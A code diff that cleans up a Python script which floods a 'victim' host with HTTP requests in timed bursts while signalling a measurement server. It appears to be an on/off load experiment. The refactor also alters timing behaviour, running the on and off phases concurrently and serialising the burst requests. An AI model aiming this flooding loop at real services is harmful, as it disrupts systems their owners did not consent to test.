@@ -2,103 +2,100 @@ import os
 import time
 import threading
 import requests
+import logging
+from concurrent.futures import ThreadPoolExecutor
 
-config=dict(os.environ)
-measure=config['measure']
-victim=config['victim']
+config = dict(os.environ)
+measure = config.get('measure', '')  # Retrieve the 'measure' configuration variable from the environment
+victim = config.get('victim', '')  # Retrieve the 'victim' configuration variable from the environment
 
-burst="""/json"""
+burst = "/json"
 
-###########################################
-# generate a request
-###########################################
-def send_request(host,payload):
-	print(payload)
-	requests.get("http://{host}{payload}".format(host=host,payload=payload))
-	'''payload=raw_payload%(host)
-	syn=IP(dst=host)/TCP(dport=port,flags='S')
-	syn_ack = sr1(syn,verbose=0)
-	request=IP(dst=host)/TCP(dport=port,sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack,ack=syn_ack[TCP].seq+1,flags='A')/payload
-	response=sr1(request,verbose=1)
-	print(response)'''
-	return 0
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
-###########################################
-# generate burst for d seconds
-###########################################
+def send_request(host, payload):
+    """
+    Send a HTTP GET request to the specified host with the given payload.
+
+    Args:
+        host (str): The host to send the request to.
+        payload (str): The payload to include in the request.
+    """
+    logger.debug("Sending request: %s", payload)
+    try:
+        requests.get(f"http://{host}{payload}")
+    except requests.RequestException as e:
+        logger.error("Request failed: %s", str(e))
+
 def sequence_on(p):
+    """
+    Perform the 'on' sequence by flooding the victim with bursts.
 
-	end=time.time()+p
+    Args:
+        p (int): The duration of each burst in seconds.
+    """
+    end = time.time() + p
 
-	send_request(measure,"/On/Start")
-	
-	# notify measurement process of the burst start
-	send_request(measure,"/On/Burst")
-	print("flooding")
-	
-	# send bursts to victim, each burst lasts for p seconds
-	while(time.time()<end):
-		t=threading.Thread(target=timeout_worker,args=(send_request,{"host":victim,"payload":burst},end,'burst'))
-		t.start()
+    send_request(measure, "/On/Start")
+    send_request(measure, "/On/Burst")
+    logger.info("Flooding...")
 
-	# notify measurement process that the burst is over
-	send_request(measure,"/On/Idle")
-	print("iteration complete")
-	
-	# the burst is repeated after 10-p seconds
-	time.sleep(10-p)
-	
-	# notify measurement process that the test iteration is over
-	send_request(measure,"/On/Iteration")
+    while time.time() < end:
+        with ThreadPoolExecutor() as executor:
+            executor.submit(send_request, victim, burst)
 
-###########################################
-# idle for d seconds
-###########################################
+    send_request(measure, "/On/Idle")
+    logger.info("Iteration complete")
+
+    time.sleep(10 - p)
+    send_request(measure, "/On/Iteration")
+
 def sequence_off(p):
-	
-	end=time.time()+p
-	
-	send_request(measure,"/Off/Start")
+    """
+    Perform the 'off' sequence by idle for the specified duration.
 
-	# notify measurement process of the idle start
-	send_request(measure,"/Off/Noise")
-	
-	# do nothing
-	while(time.time()<end):
-		1
-	
-	# notify measurement process that the idle is over
-	send_request(measure,"/Off/Idle")
-	
-	# the burst is repeated after 10-p seconds
-	time.sleep(10-p)
+    Args:
+        p (int): The duration of the idle period in seconds.
+    """
+    end = time.time() + p
 
-	# notify measurement process that the test iteration is over
-	send_request(measure,"/Off/Iteration")
+    send_request(measure, "/Off/Start")
+    send_request(measure, "/Off/Noise")
 
-###########################################
-# run till N seconds
-###########################################
-def timeout_worker(function,params,timeout,mode):
-	while(time.time()<timeout):
-		function(**params)
-		if mode=='burst':
-			continue
-		else:
-			break
-	return 0
+    while time.time() < end:
+        time.sleep(1)  # Idle for 1 second
 
-###########################################
-# run sequences
-###########################################
-def run(p,d):
-	print("on sequence")
-	end=time.time()+d
-	t=threading.Thread(target=timeout_worker,args=(sequence_on,{"p":p},end,'burst'))
-	t.run()
-	print("off sequence")
-	end=time.time()+d
-	t=threading.Thread(target=timeout_worker,args=(sequence_off,{"p":p},end,'burst'))
-	t.run()
+    send_request(measure, "/Off/Idle")
+    time.sleep(10 - p)
+    send_request(measure, "/Off/Iteration")
 
-run(5,100)
+def run(p, d):
+    """
+    Run the test for the specified duration.
+
+    Args:
+        p (int): The duration of each burst/idle period in seconds.
+        d (int): The total duration of the test in seconds.
+    """
+    logger.info("Starting the test")
+    end = time.time() + d
+
+    with ThreadPoolExecutor() as executor:
+        executor.submit(timeout_worker, sequence_on, p, end)
+        executor.submit(timeout_worker, sequence_off, p, end)
+
+def timeout_worker(function, p, end):
+    """
+    Execute the specified function until the given end time.
+
+    Args:
+        function (callable): The function to execute.
+        p (int): The parameter to pass to the function.
+        end (float): The end time.
+    """
+    while time.time() < end:
+        function(p)
+
+run(5, 100)
